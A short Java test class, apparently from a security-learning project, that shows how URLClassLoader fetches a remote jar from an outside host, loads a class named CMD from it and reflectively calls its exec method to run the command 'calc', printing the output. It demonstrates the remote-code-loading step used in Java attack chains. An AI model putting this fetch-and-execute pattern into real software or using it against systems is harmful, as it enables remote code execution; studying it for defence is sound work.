/*
 * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.
 * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.
 * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.
 * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.
 * Vestibulum commodo. Ut rhoncus gravida arcu.
 */

package com.y5neko.sec.classloader;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;
public class TestURLClassLoader {
    public static void main(String[] args) {
        try {
            //定义远程jar包路径
            URL url = new URL("https://www.ysneko.com/CMD.jar");
            System.out.println(url);

            //创建URLClassLoader对象，并加载远程jar包
            URLClassLoader ucl = new URLClassLoader(new URL[] {url});
            System.out.println(ucl);

            String cmd = "calc";

            //通过URLClassLoader加载远程jar包中的CMD类
            Class<?> cmdClass = ucl.loadClass("CMD");

            //调用CMD类中的exec方法，等同于“Process process = CMD.exec(cmd);”
            Process process = (Process) cmdClass.getMethod("exec", String.class).invoke(null,cmd);

            //获取命令执行结果的输入流
            InputStream in = process.getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] b = new byte[1024];
            int a = -1;

            // 读取命令执行结果
            while ((a = in.read(b)) != -1) {
                baos.write(b, 0, a);
            }

            System.out.println(baos);

        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
